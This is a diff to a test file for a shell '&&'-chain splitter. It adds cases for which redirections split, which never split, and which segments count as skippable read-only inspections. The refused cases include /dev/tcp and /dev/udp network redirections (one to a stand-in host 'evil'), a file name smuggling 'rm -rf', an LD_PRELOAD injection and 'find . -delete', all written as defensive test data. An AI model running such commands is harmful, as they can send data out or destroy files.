@@ -14,6 +14,8 @@ import { describe, expect, it } from "vitest";
 import {
   SHELL_AND_CHAIN_SPLITTER_VERSION,
   isOptionalSetupSegment,
+  isSkippableSegment,
+  shellAndChainSegmentText,
   splitShellAndChain,
 } from "../src/shell-and-chain.js";
 
@@ -69,6 +71,8 @@ describe("splitting a shell && chain", () => {
     ["make > log 2>&1 && ls", ["make > log 2>&1", "ls"]],
     ["sort < in > out && ls", ["sort < in > out", "ls"]],
     ["make > 'my log' && ls", ["make > 'my log'", "ls"]],
+    ["make > /tmp/build.log && ls", ["make > /tmp/build.log", "ls"]],
+    ["make > ./out/devices.log && ls", ["make > ./out/devices.log", "ls"]],
     // The hostile target: its quoted `&&` is part of the file name, never a separator.
     ['make > "a && rm -rf b" && ls', ['make > "a && rm -rf b"', "ls"]],
   ])("splits %j at its top-level && only", (source, expected) => {
@@ -144,6 +148,21 @@ describe("splitting a shell && chain", () => {
     ["a tilde target", "make > ~/log && ls"],
     ["an equals target", "make > =log && ls"],
     ["a quoted parameter target", 'make > "$OUT" && ls'],
+    // Special files a redirection could open instead of a plain file.
+    ["a /dev/tcp output target", "curl x > /dev/tcp/1.2.3.4/80 && ls"],
+    ["a /dev/tcp input target", "cat < /dev/tcp/evil/443 && ls"],
+    ["a /dev/udp target", "make > /dev/udp/1.2.3.4/53 && ls"],
+    ["a /dev/fd target", "make > /dev/fd/3 && ls"],
+    ["a /dev/stdout target", "make > /dev/stdout && ls"],
+    ["a /dev/null target", "make 2> /dev/null && ls"],
+    ["a quoted /dev target", "make > '/dev/tcp/1.2.3.4/80' && ls"],
+    ["a doubled-slash /dev target", "make > //dev/tcp/1.2.3.4/80 && ls"],
+    ["a dotted /dev target", "make > /./dev/stdout && ls"],
+    ["a /proc target", "make > /proc/self/fd/1 && ls"],
+    ["a /sys target", "make > /sys/kernel/x && ls"],
+    ["a parent-directory target", "make > ../log && ls"],
+    ["an absolute parent-directory target", "make > /tmp/../dev/stdout && ls"],
+    ["a slash-only target", "make > / && ls"],
     ["a pipe", "make | tee log && ls"],
     ["an or-list", "make || ls && ls"],
     ["a semicolon", "make; ls && ls"],
@@ -173,6 +192,43 @@ describe("splitting a shell && chain", () => {
     ["negation", "! make && ls"],
   ])("never splits %s", (_, source) => {
     expect(splitShellAndChain("bash", source)).toBeUndefined();
+  });
+
+  it("re-splits a version-1 address under the version-1 grammar, without redirections", () => {
+    const plain = "make && ls";
+    const redirecting = "make > log && ls";
+    expect(splitShellAndChain("bash", plain, 1)).toMatchObject({ version: 1 });
+    expect(splitShellAndChain("bash", redirecting, 1)).toBeUndefined();
+    expect(shellAndChainSegmentText("bash", plain, { index: 1, count: 2, version: 1 })).toBe("ls");
+    expect(
+      shellAndChainSegmentText("bash", redirecting, { index: 0, count: 2, version: 1 }),
+    ).toBeUndefined();
+    expect(shellAndChainSegmentText("bash", redirecting, { index: 0, count: 2, version: 2 })).toBe(
+      "make > log",
+    );
+    expect(
+      shellAndChainSegmentText("bash", plain, { index: 1, count: 2, version: 3 }),
+    ).toBeUndefined();
+  });
+
+  it("lets a version-2 chain skip only mkdir -p setup and closed-list read-only inspections", () => {
+    for (const text of ["cat out/sum", "sha256sum -c out/sum", "ls", "'cat' f", "grep -c x f"]) {
+      expect(isSkippableSegment(text, 2)).toBe(true);
+      expect(isSkippableSegment(text, 1)).toBe(false);
+    }
+    expect(isSkippableSegment("mkdir -p out", 1)).toBe(true);
+    for (const text of [
+      "cat a > b",
+      "cat f 2>&1",
+      "LD_PRELOAD=x cat f",
+      "./cat f",
+      "/bin/cat f",
+      "tar -tzf f",
+      "sort -o f g",
+      "find . -delete",
+      "rm f",
+    ])
+      expect(isSkippableSegment(text, 2)).toBe(false);
   });
 
   it("splits only in POSIX shells", () => {
